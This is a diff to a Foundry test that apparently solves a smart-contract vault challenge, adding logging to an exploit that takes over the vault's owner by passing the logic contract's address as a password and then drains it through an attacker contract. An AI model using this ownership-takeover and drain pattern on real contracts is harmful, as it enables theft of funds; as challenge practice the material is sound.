@@ -32,17 +32,20 @@ contract VaultExploiter is Test {
 
         // init attacker
         AttackVault attacker = new AttackVault(address(vault), palyer);
+        console.log(palyer.balance, address(attacker).balance);
 
         // change the owner 
+        console.log("oldOwner:", vault.owner());
         bytes32 password = bytes32(uint256(uint160(address(logic))));
         attacker.attackChangeOwner(password, palyer);
-        console.log("owner:", vault.owner());
+        console.log("newOwner:", vault.owner());
         
         // attck to withdraw
         vault.openWithdraw();
         attacker.attack{value: 0.1 ether}();
 
         require(vault.isSolve(), "solved");
+        console.log(palyer.balance, address(attacker).balance);
         vm.stopPrank();
     }
 
